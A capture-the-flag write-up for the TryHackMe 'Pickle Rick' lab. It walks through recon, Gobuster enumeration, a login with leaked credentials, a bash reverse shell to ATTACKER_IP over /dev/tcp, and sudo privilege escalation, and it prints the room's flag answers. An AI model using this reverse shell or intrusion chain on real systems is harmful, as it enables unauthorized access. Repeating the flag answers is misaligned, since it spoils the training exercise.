
# Pickle Rick

Room: [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

## Reconnaissance

Since the target machine was running a **web server**, I began by visiting the website and performing basic enumeration.

While inspecting the page source, I discovered a comment containing a username.

```html
<!--
Note to self, remember username!
Username: R1ckRul3s
-->
```

This revealed the username:

```
R1ckRul3s
```

---

## Enumeration

Next, I checked the `robots.txt` file.

```
http://10.48.156.102/robots.txt
```

It contained:

```
Wubbalubbadubdub
```

This looked like a potential password.

---

### Directory Enumeration

To discover hidden directories and files, I used **Gobuster**.

```bash
gobuster dir -u http://10.48.156.102/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
```

The scan revealed several interesting files:

```
login.php
portal.php
robots.txt
index.html
```

`portal.php` redirected to `login.php`, which indicated a login page.

---

## Exploitation

I attempted to log in using the previously discovered credentials.

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

Login was successful.

After logging in, I discovered a **command execution interface** where system commands could be run.

---

# Finding the First Ingredient

I began exploring the system using basic commands.

```bash
ls
```

Output:

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Attempting to read the file using `cat` was blocked, so I used `less` instead.

```bash
less Sup3rS3cretPickl3Ingred.txt
```

First ingredient:

```
mr. meeseek hair
```

---

# Clue for the Second Ingredient

Next, I checked `clue.txt`.

```bash
less clue.txt
```

Contents:

```
Look around the file system for the other ingredient.
```

This indicated that the remaining ingredients were located somewhere else on the system.

---

# Reverse Shell

Before exploring the system further, I obtained a reverse shell to make navigation easier.

Listener on my machine:

```bash
nc -lvnp 1234
```

Reverse shell command executed through the command interface:

```bash
bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/1234 <&1'
```

Once executed, the shell connected successfully.

---

# Second Ingredient

After obtaining the shell, I explored the filesystem.

```bash
whoami
```

Output:

```
www-data
```

Navigating through directories:

```bash
cd /
ls
```

Then:

```bash
cd /home
ls
```

I found two users:

```
rick
ubuntu
```

Entering Rick's directory:

```bash
cd /home/rick
ls
```

Found:

```
second ingredients
```

Viewing the file:

```bash
cat "second ingredients"
```

Second ingredient:

```
1 jerry tear
```

---

# Privilege Escalation

Next, I searched for the final ingredient.

When attempting to access the root directory:

```bash
ls /root
```

It returned:

```
Permission denied
```

So I checked the **sudo privileges**.

```bash
sudo -l
```

Output:

```
User www-data may run the following commands on this machine:
(ALL) NOPASSWD: ALL
```

This means the `www-data` user can execute **any command as root without a password**.

---

# Third Ingredient

Using sudo, I accessed the root directory.

```bash
sudo ls /root
```

Output:

```
3rd.txt
```

Reading the file:

```bash
sudo cat /root/3rd.txt
```

Third ingredient:

```
fleeb juice
```

DONE!!!!!!!!!!!
